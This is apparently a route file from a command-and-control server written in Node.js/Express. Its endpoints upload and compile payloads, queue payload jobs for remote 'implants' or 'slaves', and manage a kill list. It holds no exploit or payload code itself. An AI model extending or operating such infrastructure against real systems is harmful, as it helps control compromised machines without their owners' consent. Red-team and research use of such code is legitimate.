/**
 * Route for /payload
 */
const router = express.Router();
const userMiddleware = require("../../middlewares/UserMiddleware");
const payloadHelper = require("../../helpers/PayloadHelper")

router.get("/", userMiddleware.hasAuthToken, (req, res) => {

    // Get all payloads.
    res.json(payloadHelper.getSources(databaseHelper.getPayloads()))
})

// Creates new payload.
router.post("/", userMiddleware.hasAuthToken, userMiddleware.checkNewPayload, 
    userMiddleware.checkPayloadExists, (req, res) => {
    
    const payload = JSON.parse(req.body.payload);
    const payloadID = cryptoHelper.createID();
    payloadHelper.createNewPayload(req.files.payloadFile, payloadID, payload.variables, (location) => {

        console.log(payload);

        console.log("Succesfully created payload at " + location)
        
        databaseHelper.addPayload({
            id: payloadID,
            name: payload.name,
            variables: payload.variables,
            command: payload.command,
            description: payload.description,
            osPayloads: payload.osPayloads ? payload.osPayloads : "",
            categories: payload.categories ? payload.categories : "",
            location: location
        })

        res.json({message: "success"});
    }, (err, compileError = false) => {

        console.log("Creating payload failed with msg: " + err);
        if (compileError)
            res.status(400).json({message: "Failed to compile payload!", compileError: err})
        else
            res.status(400).json({message: err});
    })
    
})

// router.delete("/:payloadId", userMiddleware.hasAuthToken, userMiddleware.")

router.get("/categories", userMiddleware.hasAuthToken, (req, res) => {
    res.json(payloadHelper.getCategories());
})

router.post("/launch", userMiddleware.hasAuthToken, userMiddleware.checkLaunchingPayload, (req, res) => {

    const payload = req.body;
    const jobId = cryptoHelper.createID();
    console.log(payload)

    // First compile the code and save the object in a seperate folder.
    const selectedPayload = databaseHelper.getPayloadById(payload.payloadId);
    payloadHelper.compilePayload(selectedPayload, jobId, payload.variables, (path, size) => {

        // Then add the job to the list. 
        databaseHelper.addNewJob({
            id: jobId,
            slaveId: payload.slaveId,
            payloadId: payload.payloadId,
            objectSize: size,
            location: path,
            variables: payload.variables
        })
        
        console.log("Succesfully compiled job to " + path)
        res.json({message: "Success compiling!"});

    }, (err, compileError) => {

        if (compileError)
            res.status(400).json({message: "Compile error!", compileError: err});
        else
            res.status(400).json({message: err});
    })
})

router.get("/jobs", userMiddleware.hasAuthToken, (req, res) => {
    
    res.json(payloadHelper.getJobs())
})

router.get("/jobs/:implantId", userMiddleware.hasAuthToken, (req, res) => {

    res.json(databaseHelper.getJobsForImplant(req.params.implantId));
})

router.get("/joblist", userMiddleware.hasAuthToken, (req, res) => {

    res.json(databaseHelper.getJobList())
})

router.post("/joblist", userMiddleware.hasAuthToken, userMiddleware.checkKillParams, (req, res) => {


    databaseHelper.addToKillList(req.body.slaveId, req.body.jobId);
    res.json({reason: "Okay KillBill"});
})

module.exports = router;